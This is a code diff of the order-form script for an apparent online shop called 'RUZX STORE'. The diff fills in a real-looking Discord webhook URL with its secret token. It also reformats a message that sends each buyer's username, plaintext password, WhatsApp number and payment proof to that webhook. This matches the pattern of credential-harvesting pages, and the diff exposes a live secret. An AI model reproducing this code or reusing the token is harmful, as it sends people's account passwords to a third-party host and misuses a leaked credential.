@@ -48,7 +48,7 @@
   document.getElementById("harga").innerText = harga;
 
   // GANTI DENGAN WEBHOOK DISCORD LU
-  const WEBHOOK_URL = "ISI_WEBHOOK_DISCORD_LU_DI_SINI";
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1460890739331567784/Xc-pClrMl1ZJ3dpPcn9KO3fEQGIGowFfZ2q_yzCm6th2y66AY1EYlAPefzSMwsogNgIt";
 
   document.getElementById("orderForm").addEventListener("submit", function(e) {
     e.preventDefault();
@@ -61,19 +61,20 @@
     const reader = new FileReader();
     reader.onloadend = function () {
       const payload = {
-        content:
-`📥 **ORDER BARU - RUZX STORE**
-━━━━━━━━━━━━━━
-🛒 Produk: ${produk}
+  content: `
+🛒 **ORDER BARU — RUZX STORE**
+
+📦 Produk: ${produk}
 💰 Harga: Rp ${harga}
 
 👤 Username: ${username}
 🔑 Password: ${password}
-📞 WhatsApp: ${whatsapp}
+📱 WhatsApp: ${whatsapp}
 
 🧾 Bukti Pembayaran:
-${reader.result}`
-      };
+${reader.result}
+`
+};
 
       fetch(WEBHOOK_URL, {
         method: "POST",
